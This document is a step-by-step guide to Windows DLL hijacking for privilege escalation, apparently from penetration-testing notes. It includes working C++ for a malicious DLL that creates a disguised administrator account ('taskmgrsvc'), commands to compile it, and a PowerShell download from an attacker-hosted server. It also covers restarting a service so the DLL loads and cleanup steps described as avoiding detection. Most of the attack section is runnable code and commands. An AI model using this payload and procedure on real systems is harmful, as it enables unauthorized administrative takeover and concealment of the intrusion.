## DLL Hijacking

### Overview
Dynamic Link Libraries (DLLs) are essential components in Windows systems that provide shared functionality for applications and services. When an application or service looks for a required DLL, it follows a predefined **DLL search order**:

1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory.
5. The current directory.
6. The directories listed in the PATH environment variable.

A misconfiguration or missing DLL can create an opportunity for **DLL Hijacking**, where a malicious DLL placed in a writable directory is loaded instead of the legitimate one. If the application runs with elevated privileges, the malicious DLL will execute with the same level of access.

---

### Step 1: Identify Writable Directories and Missing DLLs
First, identify directories where you have write permissions and locate missing DLLs being searched for by applications or services.

1. **Search for Writable Directories**:
   Run **WinRecon.ps1** to enumerate writable directories and check for vulnerable DLLs:
   - **Option 2**: Run Custom Recon - (Select which functions to enable).
   - **Option 18**: Perform DLL Hijacking checks against known vulnerable software and directories.

Example Output:
```plaintext
===================================================

               DLL Hijacking Check

===================================================

[+] Program: 7-Zip 21.07 (x64)
    Identifier: 7-Zip
    Version: 21.07
    Path: C:\Program Files\7-Zip\
    Path is Not Writable

[+] Program: XAMPP
    Identifier: xampp
    Version: 7.4.29-1
    Path: C:\xampp
    [!] Path is Writable

[+] Program: VMware Tools
    Identifier: {4FE02FF2-2194-4E1D-8B04-F934655966F9}
    Version: 11.3.0.18090558
    Path: C:\Program Files\VMware\VMware Tools\
    Path is Not Writable

[+] Program: FileZilla 3.63.1
    Identifier: FileZilla Client
    Version: 3.63.1
    Path: C:\FileZilla\FileZilla FTP Client
    [!] Path is Writable
    Vulnerable DLL: TextShaping.dll

[+] Program: KeePass Password Safe 2.51.1
    Identifier: KeePassPasswordSafe2_is1
    Version: 2.51.1
    Path: C:\Program Files\KeePass Password Safe 2\
    Path is Not Writable

[+] Program: Microsoft Edge
    Identifier: Microsoft Edge
    Version: 129.0.2792.52
    Path: C:\Program Files (x86)\Microsoft\Edge\Application
    Path is Not Writable

[+] Program: Microsoft Edge WebView2 Runtime
    Identifier: Microsoft EdgeWebView
    Version: 128.0.2739.79
    Path: C:\Program Files (x86)\Microsoft\EdgeWebView\Application
    Path is Not Writable

[+] Checking Operating System for Vulnerabilities...

[+] OS: Microsoft Windows 11 Pro
    Version: 10.0.22621
    Path: C:\Windows\
    Path is Not Writable
    Vulnerable DLL: apds.dll
```

In this example, the `FileZilla` application directory is writable, and the program attempts to load `TextShaping.dll`, making it a potential candidate for DLL hijacking.

---

### Step 2: Confirm Writable Permissions
Verify that the identified directory allows you to write files:

```powershell
echo "test" > 'C:\FileZilla\FileZilla FTP Client\test.txt'
```

Check if the file was successfully created:
```powershell
type 'C:\FileZilla\FileZilla FTP Client\test.txt'
```

If successful, you have sufficient permissions to place a malicious DLL in this directory.

---

### Step 3: Create a Malicious DLL
The goal is to create a DLL that executes malicious commands when loaded. In this case, the DLL will add a new user to the local Administrators group.

#### Malicious DLL Code in C++:
```cpp
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            system("net user taskmgrsvc Password123! /add");
            system("net localgroup administrators taskmgrsvc /add");
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
```

#### Compile the DLL:
On your Kali machine, cross-compile the DLL using `mingw-w64`:

```bash
x86_64-w64-mingw32-gcc malicious_dll.cpp --shared -o TextShaping.dll
```

- **`--shared`**: Generates a DLL file.
- **`TextShaping.dll`**: The name must match the vulnerable DLL identified earlier.

---

### Step 4: Transfer the DLL to the Target Directory
Host the DLL on your attacker machine and download it to the writable directory on the target system:

1. Start a Python HTTP server:
   ```bash
   python3 -m http.server 80
   ```
2. On the target system, download the DLL using PowerShell:
   ```powershell
iwr -uri http://<attacker_ip>/TextShaping.dll -OutFile 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'
   ```
3. Confirm the file exists:
   ```powershell
   ls 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'
   ```

---

### Step 5: Trigger the DLL Hijacking
Once the malicious DLL is in place, the application or service must load it. This can happen automatically when:

- The application starts.
- The service restarts.

If you have permissions to restart the service, use:
```powershell
sc.exe stop <service_name>
sc.exe start <service_name>
```

**Example**:
```powershell
sc.exe stop FileZillaService
sc.exe start FileZillaService
```

If you cannot manually restart the service, wait for a higher-privileged user to trigger the application or service.

---

### Step 6: Verify Exploitation
After the DLL executes, verify that the new user has been created and added to the Administrators group:

1. Check for the new user:
   ```powershell
   net user
   ```
2. Verify the Administrators group:
   ```powershell
   net localgroup administrators
   ```

**Output**:
```plaintext
User accounts for \TARGETSYSTEM
-------------------------------------------------------------------------------
Administrator            taskmgrsvc              DefaultAccount

Alias name     administrators
Members
-------------------------------------------------------------------------------
Administrator
taskmgrsvc
```

The output confirms that the malicious DLL was loaded, and the `taskmgrsvc` account was successfully added to the Administrators group.

---

### Cleanup
To avoid detection, clean up after exploitation:

1. Delete the malicious DLL:
   ```powershell
   del 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'
   ```
2. Remove the created user:
   ```powershell
   net user taskmgrsvc /delete
   ```

---

### Notes:
- Missing DLLs provide a great opportunity for code execution, especially if the search order allows loading from writable directories.
- Always verify writable permissions before deploying malicious DLLs.

---

### References
- [HackTricks - DLL Hijacking](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking)

---
